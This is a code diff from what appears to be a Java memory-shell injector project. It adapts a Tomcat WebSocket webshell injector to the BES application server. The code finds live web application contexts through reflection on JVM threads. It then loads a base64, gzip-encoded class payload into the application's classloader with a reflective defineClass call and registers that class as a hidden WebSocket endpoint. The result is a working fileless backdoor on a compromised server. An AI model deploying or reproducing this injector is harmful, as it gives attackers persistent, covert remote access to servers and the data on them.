@@ -1,4 +1,4 @@
-package com.reajason.javaweb.memshell.injector.tomcat;
+package com.reajason.javaweb.memshell.injector.bes;
 
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
@@ -7,14 +7,19 @@ import java.io.PrintStream;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
-import java.util.*;
+import java.util.HashSet;
+import java.util.Map;
+import java.util.Set;
 import java.util.zip.GZIPInputStream;
 
 /**
+ * BES JSR-356 WebSocket 注入器：BES 9.5+ 内置 Tomcat 系 WebSocket 实现
+ * （{@code com.bes.enterprise.web.websocket}），从 ServletContext 取出
+ * {@code ServerContainer} 后注册 Endpoint。
+ *
  * @author ReaJason
- * @since 2026/1/13
  */
-public class TomcatWebSocketByPassInjector {
+public class BesWebSocketInjector {
 
     private static String msg = "";
     private static boolean ok = false;
@@ -31,11 +36,7 @@ public class TomcatWebSocketByPassInjector {
         return "{{base64Str}}";
     }
 
-    public String getHelperBase64String() {
-        return "{{helperBase64String}}";
-    }
-
-    public TomcatWebSocketByPassInjector() {
+    public BesWebSocketInjector() {
         if (ok) {
             return;
         }
@@ -52,8 +53,11 @@ public class TomcatWebSocketByPassInjector {
                 try {
                     msg += ("context: [" + getContextRoot(context) + "] ");
                     Object shell = getShell(context);
-                    inject(context, shell);
-                    msg += "[" + getUrlPattern() + "] ready\n";
+                    if (inject(context, shell)) {
+                        msg += "[" + getUrlPattern() + "] ready\n";
+                    } else {
+                        msg += "skip, no ServerContainer\n";
+                    }
                 } catch (Throwable e) {
                     msg += "failed " + getErrorMessage(e) + "\n";
                 }
@@ -63,48 +67,11 @@ public class TomcatWebSocketByPassInjector {
         System.out.println(msg);
     }
 
-    public Set<Object> getContext() throws Exception {
-        Set<Object> contexts = new HashSet<Object>();
-        Set<Thread> threads = Thread.getAllStackTraces().keySet();
-        for (Thread thread : threads) {
-            String threadName = thread.getName();
-            if (threadName.contains("ContainerBackgroundProcessor")) {
-                Map<?, ?> childrenMap = (Map<?, ?>) getFieldValue(getFieldValue(getFieldValue(thread, "target"), "this$0"), "children");
-                for (Object value : childrenMap.values()) {
-                    Map<?, ?> children = (Map<?, ?>) getFieldValue(value, "children");
-                    contexts.addAll(children.values());
-                }
-            } else if (threadName.contains("Poller") && !threadName.contains("ajp")) {
-                try {
-                    Object proto = getFieldValue(getFieldValue(getFieldValue(getFieldValue(thread, "target"), "this$0"), "handler"), "proto");
-                    Object engine = getFieldValue(getFieldValue(getFieldValue(getFieldValue(proto, "adapter"), "connector"), "service"), "engine");
-                    Map<?, ?> childrenMap = (Map<?, ?>) getFieldValue(engine, "children");
-                    for (Object value : childrenMap.values()) {
-                        Map<?, ?> children = (Map<?, ?>) getFieldValue(value, "children");
-                        contexts.addAll(children.values());
-                    }
-                } catch (Exception ignored) {
-                }
-            } else if (thread.getContextClassLoader() != null) {
-                String name = thread.getContextClassLoader().getClass().getSimpleName();
-                if (name.matches(".+WebappClassLoader")) {
-                    Object resources = getFieldValue(thread.getContextClassLoader(), "resources");
-                    // need WebResourceRoot not DirContext
-                    if (resources != null && resources.getClass().getName().endsWith("Root")) {
-                        Object context = getFieldValue(resources, "context");
-                        contexts.add(context);
-                    }
-                }
-            }
-        }
-        return contexts;
-    }
-
     @SuppressWarnings("all")
     private String getContextRoot(Object context) {
         String r = null;
         try {
-            r = (String) invokeMethod(invokeMethod(context, "getServletContext", null, null), "getContextPath", null, null);
+            r = (String) getFieldValue(context, "encodedPath");
         } catch (Exception ignored) {
         }
         String c = context.getClass().getName();
@@ -117,7 +84,59 @@ public class TomcatWebSocketByPassInjector {
         return c + "(" + r + ")";
     }
 
-    private ClassLoader getWebAppClassLoader(Object context) {
+    /**
+     * com.bes.enterprise.webtier.core.DefaultContext
+     * /opt/bes/lib/bes-engine.jar
+     */
+    public Set<Object> getContext() throws Exception {
+        Set<Object> contexts = new HashSet<Object>();
+        Set<Thread> threads = Thread.getAllStackTraces().keySet();
+        for (Thread thread : threads) {
+            try {
+                if (thread.getName().contains("ContainerBackgroundProcessor")) {
+                    Map<?, ?> childrenMap = (Map<?, ?>) getFieldValue(getFieldValue(getFieldValue(thread, "target"), "this$0"), "children");
+                    for (Object value : childrenMap.values()) {
+                        contexts.addAll(((Map<?, ?>) getFieldValue(value, "children")).values());
+                    }
+                } else if (thread.getName().contains("AppServer-utility")) {
+                    // BES 10 / BES 11: AppServer-utility thread fallback.
+                    // BES 11 target has a wrappedRunnable field; BES 10 does not — try/catch handles both.
+                    Object target = getFieldValue(thread, "target");
+                    try {
+                        target = getFieldValue(target, "wrappedRunnable");
+                    } catch (Throwable ignored) {
+                    }
+                    Iterable<?> workQueue = (Iterable<?>) getFieldValue(getFieldValue(target, "this$0"), "workQueue");
+                    for (Object task : workQueue) {
+                        Object runnable = getFieldValue(getFieldValue(task, "callable"), "task");
+                        if (!runnable.getClass().getSimpleName().contains("ContainerBackgroundProcessor")) {
+                            continue;
+                        }
+                        Map<?, ?> childrenMap = (Map<?, ?>) getFieldValue(getFieldValue(runnable, "this$0"), "children");
+                        for (Object host : childrenMap.values()) {
+                            contexts.addAll(((Map<?, ?>) getFieldValue(host, "children")).values());
+                        }
+                    }
+                } else if (thread.getContextClassLoader() != null) {
+                    String name = thread.getContextClassLoader().getClass().getSimpleName();
+                    if (name.matches(".+WebappClassLoader")) {
+                        Object resources = getFieldValue(thread.getContextClassLoader(), "resources");
+                        // need WebResourceRoot not DirContext
+                        if (resources != null && resources.getClass().getName().endsWith("Root")) {
+                            Object context = getFieldValue(resources, "context");
+                            contexts.add(context);
+                        }
+                    }
+                }
+            } catch (Throwable ignored) {
+                // JDK 17 下单个线程的反射目标可能不可达（如 Worker.this$0），
+                // 跳过它继续找其它入口，不能让一个线程终止整个发现流程
+            }
+        }
+        return contexts;
+    }
+
+    private ClassLoader getWebAppClassLoader(Object context) throws Exception {
         try {
             return ((ClassLoader) invokeMethod(context, "getClassLoader", null, null));
         } catch (Exception e) {
@@ -133,40 +152,28 @@ public class TomcatWebSocketByPassInjector {
         try {
             clazz = classLoader.loadClass(getClassName());
         } catch (Exception e) {
-            clazz = defineShell(classLoader, getBase64String());
+            byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
+            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
+            defineClass.setAccessible(true);
+            clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
         }
         msg += "[" + classLoader.getClass().getName() + "] ";
         return clazz.newInstance();
     }
 
-    private Class<?> defineShell(ClassLoader classLoader, String base64) throws Exception {
-        byte[] clazzByte = gzipDecompress(decodeBase64(base64));
-        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
-        defineClass.setAccessible(true);
-        return ((Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length));
-    }
-
-
-    @SuppressWarnings("unchecked")
-    private void inject(Object context, Object obj) throws Exception {
+    private boolean inject(Object context, Object shell) throws Exception {
         Object servletContext = invokeMethod(context, "getServletContext", null, null);
         Object container = invokeMethod(servletContext, "getAttribute", new Class[]{String.class}, new Object[]{"javax.websocket.server.ServerContainer"});
         if (container == null) {
             container = invokeMethod(servletContext, "getAttribute", new Class[]{String.class}, new Object[]{"jakarta.websocket.server.ServerContainer"});
         }
-
         if (container == null) {
-            throw new RuntimeException("container is null");
+            return false;
         }
 
         if (invokeMethod(container, "findMapping", new Class[]{String.class}, new Object[]{getUrlPattern()}) != null) {
-            return;
+            return true;
         }
-
-        Object valve = defineShell(context.getClass().getClassLoader(), getHelperBase64String()).newInstance();
-        Object pipeline = invokeMethod(context, "getPipeline", null, null);
-        Class valveClass = context.getClass().getClassLoader().loadClass("org.apache.catalina.Valve");
-        invokeMethod(pipeline, "addValve", new Class[]{valveClass}, new Object[]{valve});
 
         ClassLoader contextClassLoader = context.getClass().getClassLoader();
         Class<?> serverEndpointConfigClass;
@@ -178,14 +185,16 @@ public class TomcatWebSocketByPassInjector {
             serverEndpointConfigClass = contextClassLoader.loadClass("jakarta.websocket.server.ServerEndpointConfig");
             builderClass = contextClassLoader.loadClass("jakarta.websocket.server.ServerEndpointConfig$Builder");
         }
+
         Constructor<?> constructor = builderClass.getDeclaredConstructor(Class.class, String.class);
         constructor.setAccessible(true);
-        Object o1 = constructor.newInstance(obj.getClass(), getUrlPattern());
-        Object endpointConfig = invokeMethod(o1, "build", null, null);
+        Object builder = constructor.newInstance(shell.getClass(), getUrlPattern());
+        Object endpointConfig = invokeMethod(builder, "build", null, null);
 
         invokeMethod(container, "setDefaultMaxTextMessageBufferSize", new Class[]{int.class}, new Object[]{52428800});
         invokeMethod(container, "setDefaultMaxBinaryMessageBufferSize", new Class[]{int.class}, new Object[]{52428800});
         invokeMethod(container, "addEndpoint", new Class[]{serverEndpointConfigClass}, new Object[]{endpointConfig});
+        return true;
     }
 
     @Override
@@ -226,47 +235,47 @@ public class TomcatWebSocketByPassInjector {
         }
     }
 
-
     @SuppressWarnings("all")
-    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) {
-        try {
-            Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
-            Method method = null;
-            while (clazz != null && method == null) {
-                try {
-                    if (paramClazz == null) {
-                        method = clazz.getDeclaredMethod(methodName);
-                    } else {
-                        method = clazz.getDeclaredMethod(methodName, paramClazz);
-                    }
-                } catch (NoSuchMethodException e) {
-                    clazz = clazz.getSuperclass();
-                }
-            }
-            if (method == null) {
-                throw new NoSuchMethodException("Method not found: " + methodName);
-            }
-            method.setAccessible(true);
-            return method.invoke(obj instanceof Class ? null : obj, param);
-        } catch (Exception e) {
-            throw new RuntimeException("Error invoking method: " + methodName, e);
-        }
-    }
-
-
-    @SuppressWarnings("all")
-    public static Object getFieldValue(Object obj, String name) throws Exception {
-        Class<?> clazz = obj.getClass();
-        while (clazz != Object.class) {
+    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) throws Exception {
+        Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
+        Method method = null;
+        while (clazz != null && method == null) {
             try {
-                Field field = clazz.getDeclaredField(name);
-                field.setAccessible(true);
-                return field.get(obj);
-            } catch (NoSuchFieldException var5) {
+                if (paramClazz == null) {
+                    method = clazz.getDeclaredMethod(methodName);
+                } else {
+                    method = clazz.getDeclaredMethod(methodName, paramClazz);
+                }
+            } catch (NoSuchMethodException e) {
                 clazz = clazz.getSuperclass();
             }
         }
+        if (method == null) {
+            throw new NoSuchMethodException("Method not found: " + methodName);
+        }
+        method.setAccessible(true);
+        return method.invoke(obj instanceof Class ? null : obj, param);
+    }
+
+    @SuppressWarnings("all")
+    public static Field getField(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
+        for (Class<?> clazz = obj.getClass();
+             clazz != Object.class;
+             clazz = clazz.getSuperclass()) {
+            try {
+                return clazz.getDeclaredField(name);
+            } catch (NoSuchFieldException ignored) {
+
+            }
+        }
         throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
+    }
+
+    @SuppressWarnings("all")
+    public static Object getFieldValue(Object obj, String name) throws NoSuchFieldException, IllegalAccessException {
+        Field field = getField(obj, name);
+        field.setAccessible(true);
+        return field.get(obj);
     }
 
     @SuppressWarnings("all")
